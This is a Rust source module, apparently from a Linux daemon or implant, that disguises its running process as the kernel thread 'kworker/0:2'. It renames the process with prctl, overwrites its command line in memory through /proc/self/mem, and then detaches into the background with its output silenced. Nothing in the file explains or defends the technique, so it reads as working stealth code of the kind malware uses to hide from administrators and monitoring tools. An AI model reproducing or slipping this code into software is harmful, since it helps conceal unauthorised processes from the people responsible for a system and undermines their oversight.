use std::path::Path;

const CAMOUFLAGE_NAME: &str = "kworker/0:2";

pub fn camouflage() -> anyhow::Result<()> {
    set_comm(CAMOUFLAGE_NAME)?;
    overwrite_cmdline(CAMOUFLAGE_NAME)?;
    Ok(())
}

fn set_comm(name: &str) -> anyhow::Result<()> {
    let mut buf = [0u8; 16];
    let len = name.len().min(15);
    buf[..len].copy_from_slice(&name.as_bytes()[..len]);
    unsafe {
        if libc::prctl(libc::PR_SET_NAME, buf.as_ptr()) != 0 {
            anyhow::bail!("prctl(PR_SET_NAME) failed");
        }
    }
    Ok(())
}

fn overwrite_cmdline(name: &str) -> anyhow::Result<()> {
    let (arg_start, arg_end) = read_arg_region()?;
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .open("/proc/self/mem")?;
    use std::io::{Seek, Write};
    f.seek(std::io::SeekFrom::Start(arg_start))?;
    let region_len = (arg_end - arg_start) as usize;
    let zeros = vec![0u8; region_len];
    f.write_all(&zeros)?;
    f.seek(std::io::SeekFrom::Start(arg_start))?;
    f.write_all(name.as_bytes())?;
    f.write_all(&[0])?;
    Ok(())
}

fn read_arg_region() -> anyhow::Result<(u64, u64)> {
    let stat = std::fs::read_to_string("/proc/self/stat")?;
    let after_comm = stat
        .rfind(')')
        .map(|i| &stat[i + 2..])
        .ok_or_else(|| anyhow::anyhow!("malformed /proc/self/stat"))?;
    let fields: Vec<&str> = after_comm.split_whitespace().collect();
    let arg_start: u64 = fields
        .get(45)
        .ok_or_else(|| anyhow::anyhow!("too few fields in /proc/self/stat"))?
        .parse()?;
    let arg_end: u64 = fields
        .get(46)
        .ok_or_else(|| anyhow::anyhow!("too few fields in /proc/self/stat"))?
        .parse()?;
    Ok((arg_start, arg_end))
}

pub fn write_pid(path: &Path) -> anyhow::Result<()> {
    let pid = std::process::id();
    crate::platform::fs::atomic_write(path, pid.to_string().as_bytes())
}

pub fn read_pid(path: &Path) -> Option<i32> {
    std::fs::read_to_string(path)
        .ok()?
        .trim()
        .parse()
        .ok()
}

pub fn is_running(pid: i32) -> bool {
    Path::new(&format!("/proc/{pid}/cmdline")).exists()
}

pub fn daemonize() -> anyhow::Result<()> {
    use nix::unistd::{fork, setsid, ForkResult};

    match unsafe { fork() }? {
        ForkResult::Parent { .. } => std::process::exit(0),
        ForkResult::Child => {}
    }

    setsid()?;

    // Redirect std fds to /dev/null
    let devnull = std::fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/null")?;
    use std::os::unix::io::AsRawFd;
    unsafe {
        libc::dup2(devnull.as_raw_fd(), 0);
        libc::dup2(devnull.as_raw_fd(), 1);
        libc::dup2(devnull.as_raw_fd(), 2);
    }

    Ok(())
}
